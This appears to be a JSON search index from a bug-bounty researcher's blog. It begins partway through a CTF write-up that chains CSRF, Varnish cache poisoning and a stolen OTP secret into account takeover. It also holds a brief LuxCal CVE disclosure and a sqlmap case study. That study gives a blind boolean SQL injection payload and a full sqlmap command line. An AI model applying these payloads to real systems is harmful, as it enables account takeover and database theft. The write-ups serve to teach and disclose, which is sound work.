mission:\nSend icarus a small transaction with a note containing the Markdown ![](/reset-2fa?123.jpg) When viewed, this will trigger a CSRF which will store a new OTP key in icarus's database account The content of the request will be (incorrectly) cached by Varnish We can request the same page to see the cached content We can use the OTP secret to configure our TOTP authenticator app to generate codes allowing us to log into the icarus account (as we already have the account password) Seems simple, right? I ran through this all, super excited, sent the request to http://46.101.25.63:31787/reset-2fa?123.jpg and.... got my own account 2FA reset - it wasn't the same OTP key that was cached. Why not!??!?!\nTurns out I had overlooked a key part of the Varnish configuration at the beginning of the VCL file:\n1sub vcl_hash { 2 hash_data(req.url); 3 4 if (req.http.host) { 5 hash_data(req.http.host); 6 } else { 7 hash_data(server.ip); 8 } 9 10 return (lookup); 11} The vcl_hash function is used to determine what elements of a request make it \u0026quot;unique\u0026quot; such that cached results can be looked up and returned (ref. VCL documentat of hashing). In this case, we can see that the Varnish hash is computed by:\nThe URL contents The Host header (if present) or server IP (if header is not present) So in this case, we are not seeing the cached content because the icarus bot is accessing it using the localhost URL as we saw above:\n1\tawait page.goto(\u0026#39;http://127.0.0.1/transactions\u0026#39;, { Therefore, the request http://127.0.0.1/reset-2fa is not equivalent to our request to the external IP address, thus we don't see the cached result. Fortunately this was an easy fix, we simply needed to change the value of the Host header in Burp to 127.0.0.1 to ensure we hit the same Varnish hash entry as icarus hit:\nWe can see in the response presumably the same OTP secret that was saved to the database under icarus's account:\n1\t\u0026lt;script\u0026gt; 2\tgenQRCode(\u0026#39;PFFF2UZEMUGSAN2H\u0026#39;); 3\t\u0026lt;/script\u0026gt; Finishing Up Now that we have the response and a QR code (we can show this page in the browser to get the QR code), the rest of the exercise was simply to log into icarus's account using the stolen OTP secret, transfer funds to our own wallet, and log into our own wallet to see the flag:\nFinal Thoughts Overall this was an extremely fun web challenge that required a number of creative solutions to achieve the seemingly obvious initial goal. I appreciate the designer who put this together!\n","link":"https://www.pmnh.site/post/ctf-htb-cyber-apolcalypse-web-genesis-wallet/","section":"post","tags":["ctf","nodejs","varnish","csrf"],"title":"CTF Writeup: 2022 HTB Cyber Apolcalypse Web Challenge: Genesis Wallet"},{"body":"","link":"https://www.pmnh.site/tags/nodejs/","section":"tags","tags":null,"title":"nodejs"},{"body":"","link":"https://www.pmnh.site/tags/varnish/","section":"tags","tags":null,"title":"varnish"},{"body":"","link":"https://www.pmnh.site/tags/authentication/","section":"tags","tags":null,"title":"authentication"},{"body":"","link":"https://www.pmnh.site/tags/cve/","section":"tags","tags":null,"title":"cve"},{"body":"Summary In research related to a Synack Red Team client, I was able to discover several authentication bypass issues in the LuxCal web calendar component. The limited details of these issues, which have been resolved by the vendor in version 5.2.0 of the software, are listed below. As an agreement with the vendor, we are releasing very limited information on this bypass. This resulted in the assignment of 2 CVEs from MITRE.\nCVSS for both is AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H 9.8.\nI'd like to thank the vendor for being extremely responsive to this issue!\nCVE 2021-45914 In LuxSoft LuxCal Web Calendar before 5.20, an unauthenticated attacker can mainipulate a POST request. This allows the attacker's session to be authenticated as any registered LuxCal user, including the site administrator.\nCVE 2021-45915 In LuxSoft LuxCal Web Calendar before 5.20, an unauthenticated attacker can mainipulate a cookie value. This allows the attacker's session to be authenticated as any registered LuxCal user, including the site administrator.\nRemediation Upgrade to version 5.2 of the LuxCal component at the vendor's site here\nMore details are available from the vendor here\nTimeline 2021 Dec 9 - Vendor contacted with details of the vulnerability 2021 Dec 9-23 - Researcher/vendor work together to qualify patch 2022 Jan 15 - Vendor releases V5.2.0 with remediation 2022 May 9 - Public release (agreed on 90 day+ hold time to allow customers to upgrade) ","link":"https://www.pmnh.site/post/cve-luxcal-2021/","section":"post","tags":["cve","authentication"],"title":"LuxCal 5.1.x and below Authentication Bypass: CVE-2021-45914, CVE-2021-45915"},{"body":"","link":"https://www.pmnh.site/tags/advanced/","section":"tags","tags":null,"title":"advanced"},{"body":"Summary Many new bug bounty hunters will blindly rely on the output of tools to magically find them bugs. As most experienced hunters know, the key to long-term success is to understand how to effectively use the many great tools and fine-tune these tools to achieve results in the form of valuable, challenging bugs.\nSince I joined the Synack Red Team, I have been digging into sqlmap and the intricacies involved in finding SQL injections \u0026quot;in the wild\u0026quot;. This will be the first of hopefully several posts on how to use sqlmap to work around challenging real-world scenarios where SQL injections exist. I hope you find this useful in your research!\nOn Manual Testing In almost all cases I never run sqlmap without first manually confirming the presence of a vulnerability! Don't be an irresponsible hunter - do your research manually or with low-impact scanning first!\nScenario In this scenario I was able to find a SQL injection vulnerability through source code auditing of the application I was testing. The application took a certain parameter and issued 2 SQL queries with it. The first query looked like this (partial query):\n1... select OID from pg_namespace where nspname=\u0026#39;{parameter}\u0026#39; ... If this query succeeded (returned a row), the code would issue a 2nd query as below:\n1select distinct object from {parameter} ... If the first query did not return a row, the code would instead throw a Python error:\n1AttributeError: \u0026#39;NoneType\u0026#39; object has no attribute So this means that in order to pass both queries the {parameter} needed to be a valid string in the first query and a valid table or view name in the 2nd query! Unfortunately this is inherently incompatible with the need to be able to construct a valid boolean true/false expression. I had to find another approach.\nThe Approach I determined that it was not going to be possible to get a payload that would successfully pass both queries, therefore I determined that I had to construct a payload that would satisfy the first query enough to generate a true/false result. \u0026quot;True\u0026quot; would mean the code would successfully execute the first query, and fail in the 2nd query. \u0026quot;False\u0026quot; would mean the code would successfully execute the first query, but because a row was not returned from the query, it would generate the AttributeError message. This got me set up with the \u0026quot;True\u0026quot; and \u0026quot;False\u0026quot; conditions I needed for sqlmap to work properly:\n\u0026quot;True\u0026quot;: Error message contains select distinct object from \u0026quot;False\u0026quot;: Error message contains AttributeError: 'NoneType' One other Wrinkle Because of the nature of the code involved, the SQL injection payload needed to be placed in the middle of the query parameter string in a specific location. Let's say the query parameter looked like this:\n1param=canary.bluebird The position of the SQL injection payload had to be here:\n1param=canary.bluebird 2 ^^ Basically, it had to be placed before the . character, in the middle of the string, in order for the first SQL query to successfully execute.\nValidating the Approach I tested this approach by the following query:\n1param=`cana\u0026#39;||(select/**/\u0026#39;r\u0026#39;/**/where/**/1=1)||\u0026#39;y.bluebird` I confirmed this corresponded to the \u0026quot;true\u0026quot; result (getting past the first SQL query and a syntax error on the 2nd). Changing the 1=1 to 0=1 confirmed the behavior of the \u0026quot;false\u0026quot; result (AttributeError). Great!\nNow, on to getting sqlmap to follow this same manual approach.\nA Couple more Wrinkles A few other wrinkles came up in my manual testing:\nBoth \u0026quot;true\u0026quot; and \u0026quot;false\u0026quot; resulted in an error page with HTTP status 500 The URL parameter had to be issued without URL encoding (i.e. ' instead of %27) Because of this, the inclusion of space characters would break the request, so they had to be replaced with comments /**/ I had to make sure that sqlmap followed these as well.\nWrangling sqlmap Let's get the easy stuff out of the way first:\nDon't encode URL parameters: use the --skip-urlencode flag Change spaces to comments: use the --tamper=space2comment flag to invoke this tamper script Tamper scripts modify the payload before it is sent to the target site! Match HTTP code 500 as part of the \u0026quot;true\u0026quot; result: use the --code=500 flag As an interesting side note: without this, sqlmap will assume a non-2xx status code is a failure (neither true nor false) and will ignore the result Now we need to get the positioning of the payload correct. We can use the --prefix and -suffix flags for this as follows:\n1--prefix=\u0026#34;cana\u0026#39;||\u0026#34; --suffix=\u0026#34;||\u0026#39;y.bluebird\u0026#34; If you are following along, you might wonder where the r character in canary went. Remember the injection point needs to be before the . in the valid parameter string. Remember a valid query \u0026quot;true/false\u0026quot; will look like this:\n1param=`cana\u0026#39;||(select/**/\u0026#39;r\u0026#39;/**/where/**/1=1)||\u0026#39;y.bluebird` You can see the r is being returned from the inner select statement if the where clause evaluates to \u0026quot;true\u0026quot;. If it evaluates to \u0026quot;false\u0026quot;, no value is returned, and we know that the parameter value of canay.bluebird (no r) will return 0 rows. This type of SQL injection corresponds to the sqlmap payload with \u0026quot;original value\u0026quot; in the name.\nTip: sqlmap has two types of payloads: one where the boolean condition returns the original value inline in the query, and the other where the boolean result is appended to the original value (the classic AND 1=1 type of payload) In this case, trying to get an AND 1=1 type payload in the middle of our parameter would make no sense at all! Therefore we're looking only for blind boolean payloads that use the original value in the constructed query string.\nThe final piece of the puzzle is helping sqlmap determine a true vs false result. In this case we use the --string parameter to suggest to sqlmap text that is guaranteed only to appear when the boolean value is true. In our analysis we determined the displayed error message will contain the string select distinct object from.\nPutting it all together, the final sqlmap command line looked like this:\n1...\u0026amp;param=r -p param --prefix=\u0026#34;cana\u0026#39;||\u0026#34; --suffix=\u0026#34;||\u0026#39;y.bluebird\u0026#34; --tamper space2comment --level=3 --risk=2 --string \u0026#34;select distinct object from ucon_p\u0026#34; --code=500 --dbms PostgreSQL --skip-urlencode --no-escape --no-cast --banner --technique=B With this combination of parameters I was able to translate my manual confirmation of the SQLi with the automatic data gathering magic of sqlmap\nFeedback? Hopefully this article was helpful in outlining how to reason through a complex SQL injection vulnerability. If you have any comments or want to collaborate on a report feel free to DM me on Twitter, I'm always open to collaboration with trusted people.\nLinks A couple other resources that cover this sort of advanced sqlmap content well:\nhttps://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/ https://thegreycorner.com/2017/01/05/exploiting-difficult-sql-injection.html ","link":"https://www.pmnh.site/post/advanced-sqlmap-case-study-1/","section":"post","tags":["sqlmap","sqli","advanced"],"title":"Advanced sqlmap Case Study"},{"body":"","link":"https://www.pmnh.site/tags/sqli/","section":"tags","tags":null,"title":"sqli"},{"body":"","link":"https://www.pmnh.site/tags/sqlmap/","section":"tags","tags":null,"title":"sqlmap"},{"body":"Brief Bio I'm a software developer, architect, author by trade, with years of experience in software large (millions of users) and small startups and non-profits. Recently I took a more active role in a life-long hobby of playing with security, cryptography, and puzzles into a full-on passion for security research, bug bounty, and the like.\nMy Stats I started bug bounty as a hobby in Sep 2020. I've hacked on 3 major platforms, my profiles are linked below:\nHackerOne - ~4000 rep, 7.0 signal, 23.5 impact Bugcrowd - ~550 pts, 100% accuracy, 15 P1s Synack (SRT) - level 0x05, top 10 globally I actively hunted on HackerOne from Sep 2020-Aug 2021. During this time, I was in the top 10 on the US leaderboard, delivering critical and high findings on numerous private and public programs. Towards the end of the year I moved to Bugcrowd, as well as joined the Synack Red Team (SRT), where I perform my primary hunting today, currently maintaining a top 5 position on the global SRT leaderboard.\nMy focus areas are deep recon / research and P1/P2/P3 findings. I'm always happy to discuss techniques around these or collaborate with hackers - ping me on Twitter (@pmnh_) or Discord (pmnh#8207). I haven't ever intentionally filed a P4/P5, so I can't really help you with questions about this class of bugs.\nWhy Read This Site? This simple site captures some stories and learnings on this journey. I hope you find it useful. I aim to publish once or twice monthly. My goal is to share interesting findings as well as some metrics and learnings as a relative newcomer to this field.\nThis site is not intended for people new to bug bounty, but instead targeting those looking to improve their craft, read more technical articles, and generally \u0026quot;talk shop\u0026quot;. In most cases I won't be explaining commonly Google-able terms and suggest you rely on the many great resources around the web for bug bounty basics.\nHow Do You Pronounce pmnh? You can simply say each letter üòÑ\nFeedback / Questions? Feel free to send any feebdack my way on Twitter, I can be reached at @pmnh_ - unfortunately my social media presence doesn't match my bug bounty platform names, sorry for any confusion üòÑ\n","link":"https://www.pmnh.site/about/","section":"","tags":null,"title":"About"},{"body":"","link":"https://www.pmnh.site/categories/","section":"categories","tags":null,"title":"Categories"},{"body":"","link":"https://www.pmnh.site/tags/index/","section":"tags","tags":null,"title":"index"},{"body":"","link":"https://www.pmnh.site/series/","section":"series","tags":null,"title":"Series"}]